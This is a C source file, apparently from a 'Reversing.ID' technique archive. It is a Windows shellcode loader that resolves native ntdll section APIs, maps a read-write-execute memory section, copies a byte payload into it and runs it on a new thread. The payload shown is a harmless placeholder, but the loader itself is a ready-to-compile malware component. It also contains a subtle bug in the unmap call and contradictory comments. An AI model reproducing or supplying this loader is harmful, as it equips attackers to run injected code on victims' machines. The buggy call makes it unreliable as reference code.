/*
    Shellcode Loader
    Archive of Reversing.ID

    Allocating new page and write shellcode into it.

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: NtCreateSection + NtMapViewOfSection
    - writing:    RtlMoveMemory
    - permission: 
    - execution:  CreateThread
*/

#include <windows.h>
#include <stdint.h>

/* ========= some definition ========= */
#define STATUS_SUCCESS       ((NTSTATUS)0x00000000L)
#define NT_SUCCESS(Status)   ((NTSTATUS)(Status) == STATUS_SUCCESS)

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
	ULONG   Length;
	HANDLE  RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG   Attributes;
	PVOID   SecurityDescriptor;
	PVOID   SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;


/* ========= function signatures ========= */
typedef NTSTATUS NTAPI NtCreateSection_t(
    PHANDLE SectionHandle,
    ULONG   DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PLARGE_INTEGER MaximumSize,
    ULONG   PageAttributess,
    ULONG   SectionAttributes,
    HANDLE  FileHandle
);
typedef NtCreateSection_t FAR * pNtCreateSection;

typedef NTSTATUS NTAPI NtMapViewOfSection_t (
    HANDLE  SectionHandle,
    HANDLE  ProcessHandle,
    PVOID  *BaseAddress,
    ULONG_PTR ZeroBits, 
    SIZE_T  CommitSize,
    PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize,
    DWORD   InheritDisposition,
    ULONG   AllocationType,
    ULONG   Protect
);
typedef NtMapViewOfSection_t FAR * pNtMapViewOfSection;

typedef NTSTATUS NTAPI NtUnmapViewOfSection_t (
    HANDLE  ProcessHandle,
    PVOID   BaseAddress
);
typedef NtUnmapViewOfSection_t FAR * pNtUnmapViewOfSection;

typedef NTSTATUS NTAPI NtClose_t (HANDLE SectionHandle);
typedef NtClose_t FAR * pNtClose;


int main ()
{
    void *  runtime = NULL;
    BOOL    retval;
    HANDLE  h_thread;
    DWORD   old_protect = 0;

    // shellcode storage in stack
    uint8_t     payload []  = { 0x90, 0x90, 0xCC, 0xC3 };
    uint32_t    payload_len = 4;

    NTSTATUS    status;
    HMODULE     ntdll;
    HANDLE      h_section;
    SIZE_T      size = 0x1000;

    LARGE_INTEGER   capacity;

    // function pointer to internal API
    pNtCreateSection        NtCreateSection;
    pNtMapViewOfSection     NtMapViewOfSection;
    pNtUnmapViewOfSection   NtUnmapViewOfSection;
    pNtClose                NtClose;

    // resolve all functions
    ntdll = GetModuleHandle("ntdll.dll");
    NtCreateSection         =   (pNtCreateSection)    GetProcAddress(ntdll, "NtCreateSection");
    NtMapViewOfSection      =  (pNtMapViewOfSection)  GetProcAddress(ntdll, "NtMapViewOfSection");
    NtUnmapViewOfSection    = (pNtUnmapViewOfSection) GetProcAddress(ntdll, "NtUnmapViewOfSection");
    NtClose                 =       (pNtClose)        GetProcAddress(ntdll, "NtClose");

    // allocate memory buffer for payload as READ-WRITE (no executable)
    capacity.HighPart = 0;
    capacity.LowPart  = 0x1000;

    // allocate memory buffer for payload as READ-WRITE-EXECUTE (RWX)
    // note: need research to makt it RW at first and then change it to RX
    NtCreateSection (&h_section, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, &capacity, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    NtMapViewOfSection (h_section, GetCurrentProcess(), &runtime, NULL, NULL, NULL, &size, 1, 0, PAGE_EXECUTE_READWRITE);

    // copy payload to the buffer
    RtlMoveMemory (runtime, payload, payload_len);

    // execute as new thread
    h_thread = CreateThread (0, 0, (LPTHREAD_START_ROUTINE) runtime, 0, 0, 0);
    WaitForSingleObject (h_thread, -1);

    // deallocate the space
    NtUnmapViewOfSection (GetCurrentProcess(), &runtime);
    NtClose (h_section);

    return 0;
}